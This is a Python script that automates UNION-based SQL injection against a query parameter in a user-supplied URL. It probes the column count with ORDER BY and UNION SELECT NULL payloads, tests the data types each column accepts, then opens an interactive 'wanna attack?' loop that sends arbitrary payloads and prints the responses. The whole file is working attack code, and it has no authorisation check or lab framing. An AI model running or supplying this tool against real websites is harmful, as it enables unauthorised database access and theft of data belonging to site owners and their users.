import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

full_url = input("enter url:")
session = requests.Session()



parse = urlparse(full_url)
    # print(parsed.scheme)    https
    # print(parsed.netloc)    example.com
    # print(parsed.path)      /post
    # print(parsed.query)     postId=3

# base_url = f"{parse.scheme}://{parse.netloc}"
# path = parse.path + ("?" + parse.query if parse.query else "")
# submit_url = base_url + path
query_params = parse_qs(parse.query)

print("\n parameters found :")
for i, key in enumerate(query_params.keys()):
    print(f"{i+1}, {key} = {query_params[key]}")

choice = int(input("\nselect param number:"))-1
edit_param = list(query_params.keys())[choice]

max_c = int(input("enter the colums number:"))
result_ord = {}
print("testing by ORDER BY:\n")
for i in range(1,max_c+1):
    test_value = f"' ORDER BY {i}--"
    test_params = query_params.copy()
    test_params[edit_param] = [test_value]
    new_query = urlencode(test_params,doseq=True)
    new_url = urlunparse(parse._replace(query=new_query))
    print(f"[{i}] tessting: {new_query}")
    res = session.get(new_url)
    result_ord[new_query] = len(res.text)
    print(f"status code: {res.status_code}")
# print(result_ord)
all_len = list(result_ord.values())
print(all_len)

result_null = {}
print("tessting by NULL:\n")
for i in range(1, max_c+1):
    nulls = ",".join(["NULL"]*i)
    test_value = f"' UNION SELECT {nulls}--"
    test_params = query_params.copy()
    test_params[edit_param] = [test_value]
    new_query = urlencode(test_params,doseq=True)
    new_url = urlunparse(parse._replace(query=new_query))
    print(f"[{i}] testing: {new_query}")
    res = requests.get(new_url)
    result_null[new_query] = len(res.text)
    print(f"status: {res.status_code}")
# print(result_null)
all_len = list(result_null.values())
print(all_len)



print("\n=========")
col_count = int(input("enter the number of col:"))

tests = {
    "string":"'dmDyCT'",
    "int": "123",
    "float": "3.14",
    "bool": "TRUE",
    "time": "2024-01-01",
    "null": "NULL"
}


print("\n [+] testing...")

for dtype, payload in tests.items():
    print(f"\n[testing : {dtype}]")

    for i in range(col_count):
        col = ["NULL"] * col_count
        col[i] = payload
        inject = f"' UNION SELECT {','.join(col)}--"

        test_params = query_params.copy()
        test_params[edit_param] = [inject]
        new_query = urlencode(test_params,doseq=True)
        new_url = urlunparse(parse._replace(query=new_query))

        try:
            res = session.get(new_url)
            print(f"[col {i+1}] payload : {inject} | status : {res.status_code} | lenght : {len(res.text)}")
        except Exception as e:
            print(f"[col {i+1}] error: {e}")
while True:
    try:
        attack = int(input("""wanna attack? 
    1 : yes
    0 : no\n"""))

        if attack == 1:
            while True:
                self_payload = input("enter your payload:")
                test_params = query_params.copy()
                test_params[edit_param] = [self_payload]
                self_query = urlencode(test_params,doseq=True)
                self_url = urlunparse(parse._replace(query=self_query))
                try:    
                    res = session.get(self_url)
                    print(res.text[:500])
                    print("\nstatus code :",res.status_code)
                    break
                except Exception as e:
                    print("pls try again")
        else:
            break
    except Exception as e:
        print("ERROR:", e)
        print("enter valid number:")